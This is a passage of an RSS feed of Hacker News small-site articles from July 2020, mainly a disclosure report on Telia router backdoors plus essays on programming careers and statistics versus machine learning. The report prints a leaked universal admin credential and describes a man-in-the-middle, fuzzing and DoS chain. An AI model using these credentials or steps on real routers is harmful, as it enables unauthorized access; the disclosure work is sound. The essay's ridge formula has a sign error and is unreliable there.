<li><strong>Kinetoplastid</strong> <strong>researchers</strong>, <strong>practitioners</strong> and <strong>clinicians</strong>. We need you dearly. We will be generating loads of hypotheses and we need you to help make sense of them. We …</li></ul></div></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://deeplearningindaba.com/grand-challenges/leishmaniasis/">https://deeplearningindaba.com/grand-challenges/leishmaniasis/</a></em></p>]]>
            </description>
            <link>https://deeplearningindaba.com/grand-challenges/leishmaniasis/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23715643</guid>
            <pubDate>Thu, 02 Jul 2020 17:24:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RCE on Telia Routers]]>
            </title>
            <description>
<![CDATA[
Score 191 | Comments 48 (<a href="https://news.ycombinator.com/item?id=23712143">thread link</a>) | @theshrike79
<br/>
July 2, 2020 | https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-backdoor.html | <a href="https://web.archive.org/web/*/https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-backdoor.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>Multiple vulnerabilities could allow running arbitrary code on an intranet server and gain root access on all the customers' routers</p>

<p>Telia is a Swedish multinational telecommunications company. It also operates in Lithuania and provides mobile service, FTTH internet, DSL internet and IPTV. Telia rents and sells custom routers and set-top tv boxes to customers which have limited or almost no administration access left to them.</p>

<p>Every Telia router or tv box has a backdoor or "management interface". It is an <code>SSH</code> server running on VLAN 5 and/or WAN. Usually, it is running on port <code>8022</code>. Older models, like <code>ADB</code>, have password login enabled. The recent newer models, like <code>Technicolor</code>, have password login disabled and only use ssh with public key authentication (spoiler: it is still vulnerable).</p>

<p>Savitarna (in Lithuanian "Self service") - is a web service <a href="https://www.telia.lt/mano/sso">https://www.telia.lt/mano/sso</a> that allows Telia customers to order and manage services, get invoices, pay bills etc. It uses password authentication or external authority logins such as Facebook, Google, banking, digital signature etc. One of the new features: changing your router's wifi password. Sounds interesting, right? An internet web service that is able to change your local router's wifi password.</p>
<p>Login page:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-login.jpg" alt="Telia Savitarna web login page"></p>
<p>Change wifi settings:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-wifi-settings.jpg" alt="Telia Savitarna WiFi setting change feature"></p>

<p>How that works. When a user wants to change the password, the web service calls the backend to initiate an SSH connection to the user's associated router. Depending on the router it will be either password authentication or RSA public key. After a successful login a PHP script on the backend will issue some commands in the router's shell, parse the result and output some of the data to the user in the web UI, like wireless network name. <strong>Telia knows your WIFI password in plain text</strong>, keep it in mind and do not reuse this password anywhere. Overall scheme:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-backdoor-scheme.jpg" alt="Overall scheme of Telia backdoor"></p>

<p>Let's take a look at how the SSH connection is established. Network capture shows an SSH client banner and the remote IP that initiated the connection:</p>
<p><code>SSH-2.0-libssh2_1.4.2 PHP 10.0.98.251</code></p>
<p>What is important here:</p>
<ul>
<li>Vulnerable <code>libssh2</code> version <code>1.4.2</code> <a href="https://www.libssh2.org/security.html">https://www.libssh2.org/security.html</a></li>
<li>Weak and deprecated key exchange <code>diffie-hellman-group1-sha1</code></li>
<li>The client does not verify <code>remote SSH server public key</code> (see below)</li>
<li><code>PHP</code></li>
</ul>
<p>And, yes, it turns out that Telia's client does not attempt to verify the remote server's public key. We were able to start a custom SSH server on the same port 8022 and Savitarna successfully established a connection without even trying to verify for a man-in-the-middle. This means that we can see the password used and could try to create a malicious SSH server that exploits public vulnerabilities on Telia's side.</p>

<p>That was an easy task. As soon as Telia's client connected to our malicious SSH server we got the universal router credentials:</p>
<pre>User: tadmin
Password: hqMV8Wps
</pre>

<p>Do you still own an ADB router? Just go ahead and login over the web interface with this user. You are now an admin. You can do some restricted stuff now, great! But what about the root shell? We were able to connect with those credentials locally and got a limited shell. That's nice too. This gave us a lot of additional information that was hidden inside the router, many more vulnerabilities. Using one of them we were able to escalate to root and got full access over the device. The newer models like Technicolor require some additional exploits chained to gain full root access, but all are publicly available and so - easily doable.</p>

<p>In order to exploit RCE we needed to build a virtual test environment that fully copies Telia's PHP client. Step by step we have gone through the sequence of Telia's commands sent over the SSH. And finally we got a malicious SSH server and a test libssh2 client running in our test lab. With this server we could fully control the protocol and start fuzzing.</p>
<p>In the first few days of the fuzzing we got some crashes and partially confirmed that RCE may be exploited. Here is a sample GIF video that demonstrates two kinds of the issues the fuzzer found for us. Same php file was executed twice, but the malicious SSH server sent different payloads which caused:</p>
<ul>
<li>Segfault (stack corruption)</li>
<li>Infinite loop with high CPU</li>
</ul>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-poc.gif" alt="GIF PoC video"></p>
<p>However, at the time of the report we couldn't find an easy way to exploit the stack corruption. It may require more time, longer and more sophisticated fuzzing and more knowledge about the server. As Lithuanian law prohibits exploit testing on the real server, we could only fingerprint the Windows OS, but nothing more.</p>

<p>The backend seems to run only 5 php processes, so it is fairly easy to perform DoS by keeping stalled ssh connections. When SSH connections stay active for too long filling all the 5 php processes (there seems to be no timeout reading the remote shell), the Savitarna will show a strange "Maintenance" message:</p>
<p>Translation:</p>
<pre>An update is in progress
Too many of you are trying to access the new Telia webpage.
We are expanding the resources and will accept you all soon.
Apologies for any inconvenience
</pre>

<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-DoS.jpg" alt="Service unavailbale"></p>

<p>If we now get all together, an attacker could exploit RCE on the intranet server and use that server to move laterally (because <code>10.0.98.251</code> is whitelisted everywhere) across all the customer routers with the same credentials creating the most powerful, persistent and undetectable botnet of Lithuania. Who knows, maybe someone already exploited that? (spoiler: see bonus section)</p>

<p>The report was responsibly disclosed to Telia and a copy sent to <code>CERT LT</code> (<a href="https://www.nksc.lt/">NKSC</a>). What happened next was a little bit of a surprise to the team. There were rumours previously about Telia's poor tech level, but we have experienced this in a real case.</p>
<p>First, Telia did not have a PGP key and did not know how to use it, so instead they asked us to ZIP the report with password and send the password over a separate email (private GMail). I hope Telia's engineers will be reading this article, so I would like to explain why the report should be encrypted. This is to protect you as the affected vendor. If there is a man in the middle who can intercept all the researcher's traffic, it will be very easy to get the ZIP file in the first email and then the password in the second email. Instead, PKI like PGP only allows to decrypt the report by the private key owner, ensuring that nobody else can intercept the report and exploit the vulnerabilities before you fix them all. </p>
<p>Second, Telia tried to threaten the reporter for the vulnerability discovery:</p>
<p>Translation:</p>
<pre>Thank you for the information
Are you sure you did not violate the electronic data protection law?
</pre>

<p>Original:</p>
<pre>Dėkojame už informaciją.
Ar tikrai tyrimą atlikote ir neviešus elektroninius duomenis rinkote
nepažeidžiant galiojančių įstatymų?
</pre>

<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-csirt-response-1.jpg" alt="Telia CSIRT email response"></p>
<p>And then they once again mentioned that they will check if this report wasn't a hacking attempt and that they will persecute any reporter that discloses any information about Telia vulnerabilities:</p>
<p>Translation:</p>
<pre>Thank you for the information. We will continue to check whether you made your report
legally without violating any law. And we will ensure that no fake information will be
published that could do any harm to the company's reputation and to the critical part
of Lithuanian network infrastructure.
</pre>

<p>Original:</p>
<pre>Dėkojame Jums už pasidalintą informaciją, kurios surinkimo teisėtumo vertinimą toliau
atliekame ir tikimės, kad į viešumą nebus paskleista tikrovės neatitinkanti ar neteisėtai
gauta informacija, kuri darytų žalą bendrovės reputacijai ir tuo pačiu sėtų nepasitikėjimą
kritine Lietuvos ryšių infrastruktūros dalimi.
</pre>

<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-csirt-response-2.jpg" alt="Telia CSIRT email confirmation"></p>
<p>We will not comment on this and let the IT community to judge. At the same time we will no longer provide any reports in any form to Telia company.</p>
<table>
<thead>
<tr>
<th>Vulnerability</th>
<th>Fixed?</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>Vulnerable libssh2</td>
<td>NO!</td>
<td><a href="https://www.libssh2.org/security.html">SSH-2.0-libssh2_1.8.0 PHP</a></td>
</tr>
<tr>
<td>Weak KEX</td>
<td>partially*</td>
<td>diffie-hellman-group-exchange-sha256</td>
</tr>
<tr>
<td>MITM</td>
<td>NO!</td>
<td>still no pub key check</td>
</tr>
<tr>
<td>Password leaked</td>
<td>NO!</td>
<td>password has not been rotated</td>
</tr>
</tbody>
</table>
<p>* Note: partial fix for KEX means the new KEX is not considered to be weak, however it is now possible to exploit libssh2 vulnerabilities after 1.8.0 with this particular KEX and a publicly known exploit for <a href="https://github.com/Semmle/SecurityExploits/blob/446048470633bf0f8da9570d008d056dbaa28ea9/libssh2/out_of_bounds_read_kex_CVE-2019-13115/server/home/diff.txt">KexAlgorithms diffie-hellman-group-exchange-sha256</a></p>

<p>After getting the root access and analyzing the Telia's routers' firmwares, we found several more users, like <code>ladmin</code> and <code>technician</code>. We will not disclose those passwords (yet), as it is not clear yet how both are used. But we were surprised that Telia's passwords appeared to be leaked many years ago. You can try to search for the tadmin password's hash on the web and you will be surprised - there was an attempt to crack the hash back in 2014!</p>
<pre>echo -n hqMV8Wps | md5sum
ff19d662d7127446d83c935e74430921  -
</pre>

<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-backdoor-leaked-password-2014.jpg" alt="Screenshot of a leaked Telia admin password MD5"></p>
<p><a href="https://webcache.googleusercontent.com/search?q=cache:J9ef6qUfrCcJ:www.md5this.com/list.php%3Fpage%3D108462%26key%3D1%26author%3DToXiC%26country%3DCyprus%26city%3DNicosia+">Webcache</a></p>
<p>And finally, we found that the hash was cracked and was available in the old "weakpass" database. You can search for the "old" weakpass database (sometimes named "First version of weakpass") and grep it - password is there. This means that most probably we are not the first who were able to penetrate Telia.</p>

<pre>2019-10-22 - tried to get in touch with Telia and asked for PGP key
2019-10-23 - password protected ZIP sent to Telia as they asked
2019-10-24 - Telia confirmed that report had been received
2019-11-21 - disclosure reminder sent to Telia
2019-11-23 - Telia tried to threaten the reporter
2019-11-27 - Telia confirmed that everything was safe, vulnerabilities were "always fixed"
2020-06-29 - full disclosure
</pre>

    </article></div>]]>
            </description>
            <link>https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-backdoor.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23712143</guid>
            <pubDate>Thu, 02 Jul 2020 11:50:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Things I wish I had known when I started programming, Part 4 (2019)]]>
            </title>
            <description>
<![CDATA[
Score 86 | Comments 36 (<a href="https://news.ycombinator.com/item?id=23711463">thread link</a>) | @juanorozcov
<br/>
July 2, 2020 | https://www.brainstobytes.com/advice-for-new-developers-or-things-i-wish-i-had-known-when-i-started-programming-part-4/ | <a href="https://web.archive.org/web/*/https://www.brainstobytes.com/advice-for-new-developers-or-things-i-wish-i-had-known-when-i-started-programming-part-4/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<!--kg-card-begin: markdown--><p>Yepp, more things I wish I'd known when I started, 4th edition.</p>
<p><em>You can find the first article in the series <a href="https://www.brainstobytes.com/advice-for-new-developers-or-things-i-wish-i-had-known-when-i-started-to-program/">here</a>.</em></p>
<p><em>And the previous article <a href="https://www.brainstobytes.com/advice-for-new-developers-or-things-i-wish-i-had-known-when-i-started-programming-part-3/">here</a></em></p>
<h2 id="lovemaintenanceworkoratleastlearntoappreciateit">Love maintenance work or at least learn to appreciate it</h2>
<p>Very few things are more despised by programmers than doing maintenance work and working with legacy apps.</p>
<p>This can be counterproductive, as most of the work available involves doing exactly that. Companies have running systems, some built a long time ago, and someone needs to maintain that code. This is especially true if you are starting at an entry position, where you'll most likely work on some old application the company has been running for more than a decade.</p>
<p>We love working on new projects for several reasons:</p>
<ul>
<li>We can choose which technology to use.</li>
<li>We can flex our creatives muscles and create something cool.</li>
<li>There's a lot of freedom when designing the solution.</li>
<li>You get to work on The Next Big Thing and all the credit it carries.</li>
</ul>
<p>The huge difference between how we perceive maintenance work and new project development is a sad thing. On one hand, most of the really important job with high impact happens on those legacy systems, whereas The Next Big Thing often goes bust. On the other hand, that cool new app will be legacy as soon as it hits production and you start receiving new requirements.</p>
<p>We should start seeing maintenance work under a more positive light. After all, most of the value provided to end users happens on those systems. We could exercise our creative muscles by refactoring and improving the design, or increasing the test coverage, all proper challenges for developers of any level.</p>
<p>Learn to love maintenance work, it's most likely what you'll spend doing most of the time as a programmer.</p>
<h2 id="makeaccomplishmentsvisible">Make accomplishments visible</h2>
<p>You are an awesome developer, always finishing tasks on time, writing ultra-complete test suites and providing to customers exactly what they want. You do a great job every day and work extra hard to ship those last-minute features. Then, that time of the year when promotions are given arrives and you... you are still in the same position?</p>
<p>I know it can be extremely frustrating, and you might end up resenting management. After all, aren't you always doing an outstanding job? how dare they pass this chance to show me how much they appreciate my hard work!</p>
<p>In reality, managers are just too busy to keep track of your accomplishments. It's your responsibility to make your contribution visible to management.</p>
<p>It doesn't even require too much effort. Keep a list of the most important things you accomplish every week, and send small reports at the end of the week listing what you accomplished. You don't need to generate a fancy document: an email with bullet points will do.</p>
<p>It has two important advantages:</p>
<ul>
<li>Management doesn't need to pester you to get an idea of what you are doing at work.</li>
<li>You keep a registry of your accomplishments, which is useful for negotiating raises and other things.</li>
</ul>
<p>Take a proactive stance on the way management evaluates you, one of the biggest mistakes you can make is to outsource that responsibility to people who are already too busy with other things. Management will appreciate it, and so will you.</p>
<h2 id="fighttheimpostersyndrome">Fight the imposter syndrome</h2>
<p>Congratulations!</p>
<p>You got your first software development job. The idea of being interviewed made you feel very anxious, but you studied hard and aced the whole thing. Finally, you arrive at the office on your first day and...</p>
<p>And it's terrifying. Suddenly, you feel like a Jon Snow who knows nothing, and self-doubt starts to creep in. What if they find out I am not that smart? do I really deserve this job? am I a fraud? how long will it take them before they find out I'm a fraud and the horrible mistake they made by hiring me?</p>
<p>The following weeks don't help that much. Perhaps it's a technology you are not that familiar with, or maybe they ask you to work on some dark corner of their massive legacy application. Solving the tasks take you twice (or more) as long as the estimate, and you grow more and more anxious.</p>
<p>Been there, more than once.</p>
<p>It's all normal, the good old imposter syndrome. It's this feeling that you are fake, and that you don't deserve to be there. It will go away after a couple of weeks and you'll start to feel more confident. Ramp-up takes time, and in truth, no one really expects you to be 100% productive from the start. Your employer knows it will take some months before you know what you are doing, so don't punish yourself that hard.</p>
<p>Keep working hard, in no time you will become an important part of the team and your contributions will start to have an impact. We've all felt it, and I guarantee you it will go away. So keep up the good work!</p>
<h2 id="ohbutialsoknewallthesethings">Oh but I also knew all these things.</h2>
<p>It's ok, maybe in the next article you'll find something you didn't know yet.</p>
<p>Thank you for reading, I hope you learned one or two new things or at least got something new to think about.</p>
<h2 id="whattodonext">What to do next:</h2>
<ul>
<li>Share this article with friends and colleagues. Thank you for helping me reach people who might find this information useful.</li>
<li>Read the <a href="https://www.brainstobytes.com/advice-for-new-developers-or-things-i-wish-i-had-known-when-i-started-programming-part-5/">next article in the series</a>.</li>
<li>Chad Fowler elaborates more on these topics and offers some really good advice in The Passionate Programmer. This and other very helpful books are in the <a href="https://www.brainstobytes.com/recommended-books/">recommended reading list</a>.</li>
<li>Send me an email with questions, comments or suggestions (it's in the <a href="https://www.brainstobytes.com/about">About Me page</a>). Come on, don't be shy!</li>
</ul>
<!--kg-card-end: markdown-->
					</div></div>]]>
            </description>
            <link>https://www.brainstobytes.com/advice-for-new-developers-or-things-i-wish-i-had-known-when-i-started-programming-part-4/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23711463</guid>
            <pubDate>Thu, 02 Jul 2020 09:29:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding Convolutional Neural Networks]]>
            </title>
            <description>
<![CDATA[
Score 89 | Comments 9 (<a href="https://news.ycombinator.com/item?id=23710799">thread link</a>) | @advanderveer
<br/>
July 2, 2020 | https://poloclub.github.io/cnn-explainer/ | <a href="https://web.archive.org/web/*/https://poloclub.github.io/cnn-explainer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://poloclub.github.io/cnn-explainer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23710799</guid>
            <pubDate>Thu, 02 Jul 2020 07:27:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Moving from Statistics to Machine Learning, the Final Stage of Grief]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 32 (<a href="https://news.ycombinator.com/item?id=23710210">thread link</a>) | @yoloswagins
<br/>
July 1, 2020 | https://ryxcommar.com/2019/07/14/on-moving-from-statistics-to-machine-learning-the-final-stage-of-grief/ | <a href="https://web.archive.org/web/*/https://ryxcommar.com/2019/07/14/on-moving-from-statistics-to-machine-learning-the-final-stage-of-grief/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-47">

	<!-- .entry-header -->

	<div>
		
<p>I’ve spent the last few months preparing for and applying for data science jobs. It’s possible the data science world may reject me and my lack of both experience and a credential above a bachelors degree, in which case I’ll do something else. Regardless of what lies in store for my future, I think I’ve gotten a good grasp of the mindset underlying machine learning and how it differs from traditional statistics, so I thought I’d write about it for those who have a similar background to me considering a similar move.<sup>1</sup></p>



<p>This post is geared toward people who are excellent at statistics but don’t really “get” machine learning and want to understand the gist of it in about 15 minutes of reading. If you have a traditional academic stats backgrounds (be it econometrics, biostatistics, psychometrics, etc.), there are two good reasons to learn more about data science:</p>



<ul><li>First, data science jobs tend to pay more than other quantitative jobs. It’s a bit taboo to bring this up– after all, aren’t we all supposed to be doing this out of passion and love? I’m not going to pretend that making more money is a bad reason to pursue something, and I reserve no judgment for those whose primary motivation is to earn more.</li><li>Second, data scientists genuinely do some pretty interesting things and have a very interesting approach to working with data, even if my gut reaction is to barf when someone says “teaching the model” instead of “estimating the parameters.”</li></ul>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>Q: What's the difference between statistics and machine learning?</p><p>A: About $50,000/year</p></div>— Senior OLS Engineer (@ryxcommar) <a href="https://twitter.com/ryxcommar/status/1131244580115046405?ref_src=twsrc%5Etfw">May 22, 2019</a></blockquote></div>
</div></figure>



<p>The world of data science is, in many ways, hiding in plain sight from the more academically-minded quantitative disciplines. I’m not going to spend much time covering the different algorithms that data scientists use: partly because a lot of the algorithms they use are the same as what statisticians use, but also because the algorithms aren’t the point of this post. In this post I’ll be writing a short guide on how to translate your statistics skills into data science very quickly.</p>



<p>After finishing this post, I recommend downloading (for free) and reading through <a href="https://web.stanford.edu/~hastie/ElemStatLearn/">The Elements of Statistical Learning</a> (herein TESL). It is an excellent and comprehensive textbook that covers all the major machine learning topics, and is geared toward people with a strong math background, especially linear algebra.</p>



<h2>Philosophical Differences Between Statistics and Machine Learning</h2>



<figure></figure>



<p>The main difference between machine learning and statistics is what I’d call “β-hat versus y-hat.” (I’ve also heard it described as inference versus prediction.) Basically, academia cares a lot about what the estimated parameters look like (β-hat), and machine learning cares more about being able to estimate a dependent variable given some inputs (y-hat). There are handful of other differences, but they are rooted in this. Once you understand this, combined with your background in stats, you will basically understand machine learning.</p>



<h4> β-Hat Versus Y-Hat</h4>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>My date: I am studying machine learning</p><p>Me [trying to impress her]: I too am studying how to do regressions in California</p></div>— Senior OLS Engineer (@ryxcommar) <a href="https://twitter.com/ryxcommar/status/1145076273410129921?ref_src=twsrc%5Etfw">June 29, 2019</a></blockquote></div>
</div></figure>



<p>Once you stop caring about your parameters, you can start making them look like nonsense, i.e. by adding <a href="https://en.wikipedia.org/wiki/Bias_of_an_estimator">bias</a> (the parameter is wrong) or <a href="https://en.wikipedia.org/wiki/Consistent_estimator">inconsistency</a> (the parameter doesn’t converge over infinite observations). In some cases, you can even turn the model into more or less a complete black box that just spits out a y-hat; this is what neural networks are, basically. Traditionally, it’s a cardinal sin in academia to use parameters like these because you can’t say anything interesting about the parameters, but the trick in machine learning is that you don’t need to say anything about the parameters. In machine learning, your focus is on describing y-hat, not β-hat.</p>



<p>Why so much love for y-hat? The friendly, less cynical answer is that within the last decade, everyone got their hands on a crap-ton of data and computational power, and they want to do cool and useful things with it. Machine learning is a pretty natural way to leverage all this data and power because machine learning has tools to deal with multicollinearity and to find really deep, hidden correlations and patterns in data. As you can imagine, machine learning doesn’t let you side-step the dirty work of specifying your data and models (a.k.a. “<a href="https://en.wikipedia.org/wiki/Feature_engineering">feature engineering</a>,” according to data scientists), but it makes it a lot easier to just run things without thinking too hard about how to set it up. In statistics, bad results can be wrong, and being right for bad reasons isn’t acceptable. In machine learning, bad results are wrong if they catastrophically fail to predict the future, and nobody cares much how your crystal ball works, they only care that it works.</p>



<figure><img src="https://thumbor.forbes.com/thumbor/960x0/https%3A%2F%2Fblogs-images.forbes.com%2Fgilpress%2Ffiles%2F2016%2F03%2FTime-1200x511.jpg" alt="Time"><figcaption>For those of you who have never done anything outside a classroom setting, this is literally every data related task, whether you’re an accountant working in Excel or a PhD data scientist working for 6-figures.<br><a href="https://www.forbes.com/sites/gilpress/2016/03/23/data-preparation-most-time-consuming-least-enjoyable-data-science-task-survey-says/#9b3182c6f637">(Source: Forbes.)</a></figcaption></figure>



<p>This newfound love for y-hat is a bit opportunistic, but in fairness, y-hat tends to be more important than β-hat for a wide array of business use cases. For example:</p>



<ul><li>Recommender systems (such as Youtube showing you more videos you might like, or showing  a customer items they might want to buy next).</li><li>Computer vision (such as optical character recognition or facial recognition).</li><li>Forecasting (such as estimating how much a customer will buy at a store, or how likely someone is to default on a loan).</li></ul>



<p>None of these tasks require having a human interpret the parameters and figure out what’s driving what to get a sufficiently acceptable answer; it’s all predictive.</p>



<h4>Letting Go of  β-Hat</h4>



<p>There are a lot of things that data scientists do that made literally zero sense to me before I grasped how to think in terms of y-hat.</p>



<p>The big one that made no sense to me the first time I encountered it back in 2017 is that data scientists split their data into <a href="https://medium.com/datadriveninvestor/data-science-essentials-why-train-validation-test-data-b7f7d472dc1f">“training data,” “validation data,” and “testing data.”</a> The reason this does not make sense to β-hat-brained people is because adding more observations should get you closer to the true parameter because, you know, the law of large numbers. There are two issues with the old school thought process. The first is that there is no “true” parameter if your parameters are intentionally allowed to be a little biased. The second is that there is no guarantee of convergence to anything if your parameters are allowed to be asymptotically inconsistent.</p>



<p>I’m sure you’re asking: “why allow your parameters to be biased?” Good question. The most straightforward answer is that there is a bias-variance trade-off. <a href="https://en.wikipedia.org/wiki/Bias%E2%80%93variance_tradeoff">The Wikipedia article </a>does a good job both illustrating and explaining it. For β-hat purposes, the notion of allowing any bias is crazy. For y-hat purposes, adding a little bias in exchange for a huge reduction in variance can improve the predictive power of your model.</p>



<figure><div>

</div></figure>



<h4>Adding Bias to OLS with Ridge Regression</h4>



<p>Ridge regression is the most straightforward example of adding bias. If you understand OLS, you’re like two paragraphs of reading away from understanding ridge regression.</p>



<p>Basically, instead of just solving for the β vector that minimizes the sum of squared residuals as one does with OLS, i.e. <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ols%7D+%3D+%7B%5Crm+argmin%7D_%7B%5Cboldsymbol%7B%5Cbeta%7D%7D+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+x_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2" title="\hat{\boldsymbol{\beta}}_{\rm ols} = {\rm argmin}_{\boldsymbol{\beta}} \sum_{i=1}^n (y_i - x_i ^{\rm T}  \beta)^2">, you can also add a “penalty” to large squared β’s while trying to find the β-hat that minimizes the objective function. So you add <img src="https://s0.wp.com/latex.php?latex=%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\lambda \sum_{j=1}^K  \beta^2" title="\lambda \sum_{j=1}^K  \beta^2"> to the objective function, where λ is some constant. Then, last but not least, you “standardize” each column <img src="https://s0.wp.com/latex.php?latex=X_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="X_j" title="X_j">, which means transforming it to <img src="https://s0.wp.com/latex.php?latex=Z_j+%5Csim+N%280%2C1%29&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="Z_j \sim N(0,1)" title="Z_j \sim N(0,1)"> by subtracting each column by the column’s mean and dividing by the column’s standard deviation: <img src="https://s0.wp.com/latex.php?latex=z_%7Bi%2Cj%7D+%3D+%28x_%7Bi%2Cj%7D+-+%5Cmu_j%29+%2F+%5Csigma_j&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j" title="z_{i,j} = (x_{i,j} - \mu_j) / \sigma_j"> (the purpose of this is to make it so the parameters measure the <em>relative</em> impacts to the overall result, as opposed to the nominal impacts, otherwise the penalty wouldn’t work the way you’d probably want it to). This gives you the ridge regression estimator:</p>



<p> <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%7B%5Crm+argmin%7D_%5Cbeta+%5Csum_%7Bi%3D1%7D%5En+%28y_i+-+z_i+%5E%7B%5Crm+T%7D++%5Cbeta%29%5E2+%2B+%5Clambda+%5Csum_%7Bj%3D1%7D%5EK++%5Cbeta%5E2&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = {\rm argmin}_\beta \sum_{i=1}^n (y_i - z_i ^{\rm T}  \beta)^2 + \lambda \sum_{j=1}^K  \beta^2"></p>



<p>At λ=0, the summation of squared β’s you just tacked onto the objective function equals zero regardless of what the β-hat vector is, so you just have OLS again. As λ→∞, the penalties for all nonzero β’s become so huge that the only way for the penalties to not overwhelm the objective function is to have all the parameters β-hat = 0. And the closed-form solution to the objective function, it turns out, is pretty similar to OLS’s closed-form solution:   <img src="https://s0.wp.com/latex.php?latex=%5Chat%7B%5Cboldsymbol%7B%5Cbeta%7D%7D_%7B%5Crm+ridge%7D+%3D+%28%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+Z-%5Clambda+%5Cmathbf+I%29%5E%7B-1%7D+%5Cmathbf+Z%5E%7B%5Crm+T%7D+%5Cmathbf+y&amp;bg=ffffff&amp;fg=6e7381&amp;s=0" alt="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y" title="\hat{\boldsymbol{\beta}}_{\rm ridge} = (\mathbf Z^{\rm T} \mathbf Z-\lambda \mathbf I)^{-1} \mathbf Z^{\rm T} \mathbf y">.</p>



<p>All pretty straightforward, but the real question is why would you do this? Well, if you don’t care about the interpretability/bias of the parameters but you want the model to predict out-of-sample better than regular OLS, you can find some value of  λ through <a href="https://en.wikipedia.org/wiki/Cross-validation_(statistics)">cross-validation</a> that gives you a better fit than  λ=0, i.e. minimizing the <a href="https://en.wikipedia.org/wiki/Mean_squared_prediction_error">prediction errors</a>. But in order to cross-validate the data, you need to split your data into data you use to estimate the parameters (training data) and data to perform the cross-validation on (validation data). This process is what sets your λ.</p>



<p>Ridge regression is OLS with L2 regularization, which is penalization by the square of the parameter. L1 regularization takes the absolute value of the parameters as the penalty instead of the square (i.e. <a href="https://en.wikipedia.org/wiki/Lasso_(statistics)">lasso</a>). And of course, L1 and L2 regularization can be used in contexts other than linear regression, such as logistic regression. These regularization methods are especially good at dealing with multicollinearity, which is definitely something you’d come across with thousands of columns of corporate data and no compelling way to decide which are the best columns to use.<sup>2</sup></p>



<p>I could go on, but regurgitating all of TESL isn’t why I wrote this blog. I like showing ridge regression as an example of machine learning because it’s very similar to OLS, but is totally and unabashedly modified for predictive purposes, instead of inferential purposes. β-hat is never the …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ryxcommar.com/2019/07/14/on-moving-from-statistics-to-machine-learning-the-final-stage-of-grief/">https://ryxcommar.com/2019/07/14/on-moving-from-statistics-to-machine-learning-the-final-stage-of-grief/</a></em></p>]]>
            </description>
            <link>https://ryxcommar.com/2019/07/14/on-moving-from-statistics-to-machine-learning-the-final-stage-of-grief/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23710210</guid>
            <pubDate>Thu, 02 Jul 2020 05:11:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No More Coffee]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 119 (<a href="https://news.ycombinator.com/item?id=23708204">thread link</a>) | @riverlong
<br/>
July 1, 2020 | https://jayriverlong.github.io/2020/06/30/coffee.html | <a href="https://web.archive.org/web/*/https://jayriverlong.github.io/2020/06/30/coffee.html">archive.org</a>
